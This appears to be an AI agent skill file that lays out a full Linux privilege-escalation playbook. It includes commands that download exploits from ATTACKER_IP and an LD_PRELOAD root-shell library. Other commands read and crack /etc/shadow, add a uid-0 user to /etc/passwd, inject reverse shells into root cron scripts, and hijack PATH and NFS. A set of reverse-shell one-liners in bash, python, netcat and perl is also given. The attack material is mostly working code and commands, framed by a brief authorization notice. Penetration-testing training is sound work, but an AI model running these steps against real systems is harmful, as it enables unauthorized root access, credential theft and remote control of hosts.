---
id: 'linux-privilege-escalation'
name: linux-privilege-escalation
description: "Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
category: security-offensive
tags:
- attack
- firewall
- security
- ui
- ux
- vuln
tools:
- claude-code
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Linux Privilege Escalation

## Purpose

Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.

## Inputs / Prerequisites

### Required Access
- Low-privilege shell access to target Linux system
- Ability to execute commands (interactive or semi-interactive shell)
- Network access for reverse shell connections (if needed)
- Attacker machine for payload hosting and receiving shells

### Technical Requirements
- Understanding of Linux filesystem permissions and ownership
- Familiarity with common Linux utilities and scripting
- Knowledge of kernel versions and associated vulnerabilities
- Basic understanding of compilation (gcc) for custom exploits

### Recommended Tools
- LinPEAS, LinEnum, or Linux Smart Enumeration scripts
- Linux Exploit Suggester (LES)
- GTFOBins reference for binary exploitation
- John the Ripper or Hashcat for password cracking
- Netcat or similar for reverse shells

## Outputs / Deliverables

### Primary Outputs
- Root shell access on target system
- Privilege escalation path documentation
- System enumeration findings report
- Recommendations for remediation

### Evidence Artifacts
- Screenshots of successful privilege escalation
- Command output logs demonstrating root access
- Identified vulnerability details
- Exploited configuration files

## Core Workflow

### Phase 1: System Enumeration

#### Basic System Information
Gather fundamental system details for vulnerability research:

```bash
# Hostname and system role
hostname

# Kernel version and architecture
uname -a

# Detailed kernel information
cat /proc/version

# Operating system details
cat /etc/issue
cat /etc/*-release

# Architecture
arch
```

#### User and Permission Enumeration

```bash
# Current user context
whoami
id

# Users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Users with home directories
cat /etc/passwd | grep home

# Group memberships
groups

# Other logged-in users
w
who
```

#### Network Information

```bash
# Network interfaces
ifconfig
ip addr

# Routing table
ip route

# Active connections
netstat -antup
ss -tulpn

# Listening services
netstat -l
```

#### Process and Service Enumeration

```bash
# All running processes
ps aux
ps -ef

# Process tree view
ps axjf

# Services running as root
ps aux | grep root
```

#### Environment Variables

```bash
# Full environment
env

# PATH variable (for hijacking)
echo $PATH
```

### Phase 2: Automated Enumeration

Deploy automated scripts for comprehensive enumeration:

```bash
# LinPEAS: download first, inspect the script, then execute only in an authorized lab
curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
less linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

Transfer scripts to target system:

```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Phase 3: Kernel Exploits

#### Identify Kernel Version

```bash
uname -r
cat /proc/version
```

#### Search for Exploits

```bash
# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Manual search on exploit-db
searchsploit linux kernel [version]
```

#### Common Kernel Exploits

| Kernel Version | Exploit | CVE |
|---------------|---------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

#### Compile and Execute

```bash
# Transfer exploit source
wget http://ATTACKER_IP/exploit.c

# Compile on target
gcc exploit.c -o exploit

# Execute
./exploit
```

### Phase 4: Sudo Exploitation

#### Enumerate Sudo Privileges

```bash
sudo -l
```

#### GTFOBins Sudo Exploitation
Reference https://gtfobins.github.io for exploitation commands:

```bash
# Example: vim with sudo
sudo vim -c ':!/bin/bash'

# Example: find with sudo
sudo find . -exec /bin/sh \; -quit

# Example: awk with sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# Example: python with sudo
sudo python -c 'import os; os.system("/bin/bash")'

# Example: less with sudo
sudo less /etc/passwd
!/bin/bash
```

#### LD_PRELOAD Exploitation
When env_keep includes LD_PRELOAD:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute with sudo
sudo LD_PRELOAD=/tmp/shell.so find
```

### Phase 5: SUID Binary Exploitation

#### Find SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### Exploit SUID Binaries
Reference GTFOBins for SUID exploitation:

```bash
# Example: base64 for file reading
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# Example: cp for file writing
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# Example: find with SUID
find . -exec /bin/sh -p \; -quit
```

#### Password Cracking via SUID

```bash
# Read shadow file (if base64 has SUID)
base64 /etc/shadow | base64 -d > shadow.txt
base64 /etc/passwd | base64 -d > passwd.txt

# On attacker machine
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Add User to passwd (if nano/vim has SUID)

```bash
# Generate password hash
openssl passwd -1 -salt new newpassword

# Add to /etc/passwd (using SUID editor)
newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### Phase 6: Capabilities Exploitation

#### Enumerate Capabilities

```bash
getcap -r / 2>/dev/null
```

#### Exploit Capabilities

```bash
# Example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: vim with cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# Example: perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Phase 7: Cron Job Exploitation

#### Enumerate Cron Jobs

```bash
# System crontab
cat /etc/crontab

# User crontabs
ls -la /var/spool/cron/crontabs/

# Cron directories
ls -la /etc/cron.*

# Systemd timers
systemctl list-timers
```

#### Exploit Writable Cron Scripts

```bash
# Identify writable cron script from /etc/crontab
ls -la /opt/backup.sh        # Check permissions
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# If cron references non-existent script in writable PATH
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
chmod +x /home/user/antivirus.sh
```

### Phase 8: PATH Hijacking

```bash
# Find SUID binary calling external command
strings /usr/local/bin/suid-binary
# Shows: system("service apache2 start")

# Hijack by creating malicious binary in writable PATH
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary      # Execute SUID binary
```

### Phase 9: NFS Exploitation

```bash
# On target - look for no_root_squash option
cat /etc/exports

# On attacker - mount share and create SUID binary
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs

# Create and compile SUID shell
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell

# On target - execute
/share/shell
```

## Quick Reference

### Enumeration Commands Summary
| Purpose | Command |
|---------|---------|
| Kernel version | `uname -a` |
| Current user | `id` |
| Sudo rights | `sudo -l` |
| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| NFS exports | `cat /etc/exports` |

### Reverse Shell One-Liners
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### Key Resources
- GTFOBins: https://gtfobins.github.io
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

## Constraints and Guardrails

### Operational Boundaries
- Verify kernel exploits in test environment before production use
- Failed kernel exploits may crash the system
- Document all changes made during privilege escalation
- Maintain access persistence only as authorized

### Technical Limitations
- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
- AppArmor/SELinux may restrict exploitation techniques
- Container environments limit kernel-level exploits
- Hardened systems may have restricted sudo configurations

### Legal and Ethical Requirements
- Written authorization required before testing
- Stay within defined scope boundaries
- Report critical findings immediately
- Do not access data beyond scope requirements

## Examples

### Example 1: Sudo to Root via find

**Scenario**: User has sudo rights for find command

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: SUID base64 for Shadow Access

**Scenario**: base64 binary has SUID bit set

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# Crack offline with john
$ john --wordlist=rockyou.txt shadow.txt
```

### Example 3: Cron Job Script Hijacking

**Scenario**: Root cron job executes writable script

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# Wait 1 minute
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
| Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
